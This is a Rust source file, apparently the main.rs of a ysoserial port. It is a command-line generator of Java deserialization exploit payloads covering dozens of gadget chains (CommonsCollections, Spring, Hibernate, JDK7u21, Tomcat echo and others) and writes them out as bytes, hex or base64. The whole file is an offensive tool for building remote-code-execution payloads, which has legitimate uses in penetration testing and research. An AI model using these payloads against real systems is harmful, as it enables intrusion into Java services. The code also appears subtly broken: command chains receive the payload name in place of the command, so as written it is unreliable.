use std::collections::hash_map::RandomState;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use std::iter::FromIterator;
use std::{io, process};

use cli::ConfigArgs;
use ysoserial_rs::*;

mod cli;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = ConfigArgs::new();
    let mut payload: Vec<u8> = Vec::new();
    let command_payload_map: HashMap<&str, fn(&str) -> Vec<u8>, RandomState> =
        HashMap::from_iter([
            ("bs1", get_commons_beanutils1 as fn(&str) -> Vec<u8>),
            ("cc1", get_commons_collections1),
            ("cc2", get_commons_collections2),
            ("cc3", get_commons_collections3),
            ("cc4", get_commons_collections4),
            ("cc5", get_commons_collections5),
            ("cc6", get_commons_collections6),
            ("cc7", get_commons_collections7),
            ("cck1", get_commons_collections_k1),
            ("cck2", get_commons_collections_k2),
            ("cck3", get_commons_collections_k3),
            ("cck4", get_commons_collections_k4),
            ("clojure", get_clojure),
            ("groovy1", get_groovy1),
            ("hibernate1", get_hibernate1),
            ("hibernate2", get_hibernate2),
            ("javassist_weld1", get_javassist_weld1),
            ("jboss_interceptors1", get_jboss_interceptors1),
            ("jdk7u21", get_jdk7u21),
            ("jdk8u20", get_jdk8u20),
            ("json1", get_json1),
            ("mozilla_rhino1", get_mozilla_rhino1),
            ("mozilla_rhino2", get_mozilla_rhino2),
            ("myfaces1", get_myfaces1),
            ("rome", get_rome),
            ("spring1", get_spring1),
            ("vaadin1", get_vaadin1),
        ]);
    let url_payload_map: HashMap<&str, fn(&str) -> Vec<u8>, RandomState> = HashMap::from_iter([
        ("url_dns", get_url_dns as fn(&str) -> Vec<u8>),
        ("c3p0", get_c3p0 as fn(&str) -> Vec<u8>),
    ]);
    let header_payload_map: HashMap<&str, fn(&str, &str) -> Vec<u8>, RandomState> =
        HashMap::from_iter([
            (
                "cck1_tomcat_echo",
                get_cck1_tomcat_echo as fn(&str, &str) -> Vec<u8>,
            ),
            (
                "cck2_tomcat_echo",
                get_cck2_tomcat_echo as fn(&str, &str) -> Vec<u8>,
            ),
        ]);
    if config.list {
        println!("Payload List:\n------------");
        let mut all_payload = command_payload_map
            .keys()
            .map(|x| x.to_string())
            .collect::<Vec<String>>();
        all_payload.extend(
            url_payload_map
                .keys()
                .map(|x| x.to_string())
                .collect::<Vec<String>>(),
        );
        all_payload.extend(
            header_payload_map
                .keys()
                .map(|x| x.to_string())
                .collect::<Vec<String>>(),
        );
        all_payload.sort();
        for p in all_payload {
            println!("{}", p);
        }
        process::exit(0);
    }
    if let Some(command_func) = command_payload_map.get(&config.payload as &str) {
        payload = command_func(&config.payload);
    } else if let Some(url_func) = url_payload_map.get(&config.payload as &str) {
        payload = url_func(&config.url);
    } else if let Some(header_func) = header_payload_map.get(&config.payload as &str) {
        payload = header_func(&config.header_name, &config.command);
    } else {
        println!("暂时不支持该Payload")
    }
    match config.format.as_str() {
        "hex" => {
            let s = hex::encode(payload);
            output_format(&config, &s);
        }
        "base64" => {
            let s = base64::encode(payload);
            output_format(&config, &s);
        }
        _ => output_bytes(&config, payload),
    }

    Ok(())
}

fn output_format(config: &ConfigArgs, payload: &str) {
    if !config.output.is_empty() {
        if let Ok(mut file) = File::create(&config.output) {
            file.write_all(payload.as_bytes()).unwrap_or_default();
            println!("写入文件:{},payload大小:{}", config.output, payload.len());
        } else {
            println!("写入文件失败")
        };
    } else {
        io::stdout()
            .write_all(payload.as_bytes())
            .unwrap_or_default();
    }
}

fn output_bytes(config: &ConfigArgs, payload: Vec<u8>) {
    if !config.output.is_empty() {
        if let Ok(mut file) = File::create(&config.output) {
            file.write_all(&payload).unwrap_or_default();
            println!("写入文件:{},payload大小:{}", config.output, payload.len());
        } else {
            println!("写入文件失败")
        };
    } else {
        io::stdout().write_all(&payload).unwrap_or_default();
    }
}
